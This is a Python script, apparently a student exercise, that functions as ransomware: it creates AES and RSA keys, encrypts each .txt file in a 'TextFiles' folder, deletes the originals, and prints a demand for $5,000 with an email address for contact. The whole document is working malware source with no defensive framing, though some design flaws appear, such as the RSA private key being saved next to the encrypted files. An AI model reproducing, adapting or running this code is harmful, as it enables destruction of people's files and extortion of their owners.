import glob
import os
from Crypto.Util.Padding import pad
from Crypto.Util.Padding import unpad
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from base64 import b64encode
from base64 import b64decode

# Initiating global variables
key = get_random_bytes(16)
cipher = AES.new(key, AES.MODE_CBC)
iv = b64encode(cipher.iv).decode('utf-8')

# Public Key Encryption
keyRSA = RSA.generate(2048)
private_key = keyRSA.export_key()
file_out = open("ransomprvkey.pem", "wb")
file_out.write(private_key)
file_out.close()

public_key = keyRSA.publickey().export_key()
file_out = open("receiver.pem", "wb")
file_out.write(public_key)
file_out.close()

# Encrypting key to ransomkey.bin
recipient_key = RSA.import_key(open("receiver.pem").read())
file_out = open("ransomkey.bin", "wb")
cipher_rsa = PKCS1_OAEP.new(recipient_key)
enc_key = cipher_rsa.encrypt(key)
# Sending through the iv with the key
file_out.write(enc_key + iv.encode('utf-8'))
file_out.close()

# Getting access to .txt files
directory = os.getcwd()
os.chdir(directory + "/TextFiles")
for file in glob.glob("*.txt"):
    # Getting contents of the .txt files
    with open(file, 'rb') as message:
        data = message.read()
        ct_bytes = cipher.encrypt(pad(data, AES.block_size))
        ct = b64encode(ct_bytes).decode('utf-8')
        # Writing the encrypted .txt to file as .enc
        with open(file + ".enc", "wb") as fileOut:
            fileOut.write(ct_bytes)
            fileOut.close()
        # Deleting original files
        os.remove(file)
        message.close()

# Ransom Message
print("\n--------------------------------Your text files are now ENCRYPTED!-------------------------------- "
      "\nTo decrypt them, you need to pay me $5,000 "
      "\nAND send ransomkey.bin in your folder to... "
      "\ndp396@uowmail.edu.au"
      "\n---------------------------------------------------------------------------------------------- ")
